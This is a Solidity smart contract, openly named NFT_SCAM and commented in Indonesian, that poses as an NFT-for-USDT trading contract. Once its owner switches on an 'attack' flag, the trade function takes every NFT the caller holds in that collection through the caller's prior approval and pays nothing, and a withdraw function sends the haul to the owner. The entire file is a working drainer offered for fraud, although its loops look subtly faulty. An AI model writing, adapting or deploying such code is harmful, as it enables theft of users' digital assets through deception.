// SPDX-License-Identifier: MIT

// ini bisa kalau misalnya nanti dalam implementasi erc721nya itu ada penerapan extension ERC721Enumerable
pragma solidity 0.8.25;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address);
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool approved) external;
    function balanceOf(address owner) external view returns (uint256);
}

interface IERC721Enumerable is IERC721 {
    function totalSupply() external view returns (uint256);
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
    function tokenByIndex(uint256 index) external view returns (uint256);
}

contract NFT_SCAM{
    address owner;
    IERC721 nft;
    IERC721Enumerable nft_drain;
    IERC20 usdt;
    uint256 price_nft = 50e17;
    bool isAttack = false;
    uint256 tokenId;

    modifier onlyOwner{
        require(owner == msg.sender, "This is my scam contract hahahhaha");
        _;
    }

    constructor(address _owner, address _usdt){
        owner = _owner;
        usdt = IERC20(_usdt);
    }

    function attack() external onlyOwner{
        isAttack = true;
    }

    function trade(address _nft, uint256 _tokenId) external payable{
        nft = IERC721(_nft);
        tokenId = _tokenId;
        require(nft.ownerOf(tokenId) == msg.sender, "Please input the valid tokenid");
        if(isAttack){
            nft_drain = IERC721Enumerable(_nft);
            // nft.setApprovalForAll(address(this), true); ini nanti dilakukan sama user
            uint256 total_supply = nft.balanceOf(msg.sender);
            for(uint256 i = 0; i < total_supply; i++){
                tokenId = nft_drain.tokenOfOwnerByIndex(msg.sender, i);
                nft.safeTransferFrom(msg.sender, address(this), tokenId);
            }
        }else{
            nft.safeTransferFrom(msg.sender, address(this), tokenId);
            usdt.transfer(msg.sender, price_nft);
        }
    }

    function withdraw() external onlyOwner{
        uint256 total_supply = nft.balanceOf(address(this));
        for(uint256 i = 0; i < total_supply; i++){
            tokenId = nft_drain.tokenOfOwnerByIndex(address(this), i);
            nft.safeTransferFrom(address(this), owner, tokenId);
        }
    }
}